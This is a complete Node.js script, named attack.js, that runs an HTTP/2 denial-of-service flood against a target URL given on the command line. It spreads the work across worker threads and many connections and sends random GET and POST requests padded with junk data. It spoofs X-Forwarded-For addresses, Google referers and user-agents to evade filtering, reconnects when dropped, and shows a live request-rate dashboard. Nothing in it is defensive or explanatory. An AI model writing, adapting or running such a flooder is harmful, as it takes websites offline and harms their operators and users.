const http2 = require('http2');
const net = require('net');
const { Worker, isMainThread, workerData } = require('worker_threads');
const readline = require('readline');
const os = require('os');

const THREADS = os.cpus().length;
const CONNECTIONS_PER_THREAD = 100;
const MAX_INFLIGHT = 2000;
const LIVE_REFRESH_RATE = 3000;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;
let end;

function heavyHeaders(path) {
    return {
        ':method': Math.random() > 0.5 ? 'POST' : 'GET',
        ':path': '/' + path,
        'x-forwarded-for': `${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}`,
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'referer': 'https://google.com/search?q=' + Math.random().toString(36).substring(2),
        'origin': 'https://google.com',
        'user-agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${randInt(70,120)}) Gecko/20100101 Firefox/${randInt(80,120)}`
    };
}

function generatePayload() {
    return JSON.stringify({
        session: Math.random().toString(36).substring(2),
        data: "X".repeat(randInt(1024, 4096))
    });
}

function randInt(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}

function randomPath() {
    const parts = ['api', 'login', 'submit', 'checkout', 'report'];
    return parts[Math.floor(Math.random() * parts.length)] + `?id=${Math.random().toString(36).substring(2)}`;
}

if (isMainThread) {
    if (process.argv.length < 3) {
        console.error('Usage: node attack.js <https://target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3] || '60');
    end = Date.now() + duration * 1000;

    console.clear();
    console.log(`🚀 HTTP/2 FLOOD STARTED | Threads: ${THREADS}`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, {
            workerData: {
                target,
                duration,
                connections: CONNECTIONS_PER_THREAD
            }
        });
    }

    setInterval(() => {
        maxRps = Math.max(maxRps, rpsLastSecond);
        renderStats();
        rpsLastSecond = 0;
    }, LIVE_REFRESH_RATE);

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);

        const timeLeft = Math.max(0, (end - Date.now()) / 1000);
        const min = Math.floor(timeLeft / 60);
        const sec = Math.floor(timeLeft % 60);

        console.log(`🚀 HTTP/2 FLOOD`);
        console.log(`==============================`);
        console.log(`Total Requests : ${totalRequests}`);
        console.log(`Max RPS        : ${maxRps}`);
        console.log(`Success        : ${successCount}`);
        console.log(`Errors         : ${errorCount}`);
        console.log(`Time Remaining : ${min}:${sec < 10 ? '0' : ''}${sec}`);
    }

    const server = net.createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'req') totalRequests++, rpsLastSecond++;
            else if (msg === 'ok') successCount++;
            else if (msg === 'err') errorCount++;
        });
    });
    server.listen(9999);

} else {
    const { target, duration, connections } = workerData;
    const endTime = Date.now() + duration * 1000;
    const socket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    const url = new URL(target);
    const inflight = { count: 0 };

    function sendLoop(client) {
        if (Date.now() > endTime || inflight.count >= MAX_INFLIGHT) return;

        try {
            inflight.count++;
            const path = randomPath();
            const headers = heavyHeaders(path);
            const isPost = headers[':method'] === 'POST';

            const req = client.request(headers);

            req.on('response', () => {
                inflight.count--;
                sendStat('ok');
            });

            req.on('error', () => {
                inflight.count--;
                sendStat('err');
            });

            if (isPost) {
                req.write(generatePayload());
            }

            req.end();
            sendStat('req');

        } catch {
            inflight.count--;
            sendStat('err');
        }

        setImmediate(() => sendLoop(client));
    }

    function createConnection() {
        if (Date.now() > endTime) return;

        try {
            const client = http2.connect(target);

            client.on('connect', () => {
                for (let i = 0; i < connections; i++) {
                    sendLoop(client);
                }
            });

            client.on('error', () => {
                client.destroy();
                setTimeout(createConnection, 1000);
            });

            client.on('goaway', () => client.close());
            client.on('close', () => setTimeout(createConnection, 1000));
        } catch {
            setTimeout(createConnection, 1000);
        }
    }

    for (let i = 0; i < connections; i++) {
        createConnection();
    }
}
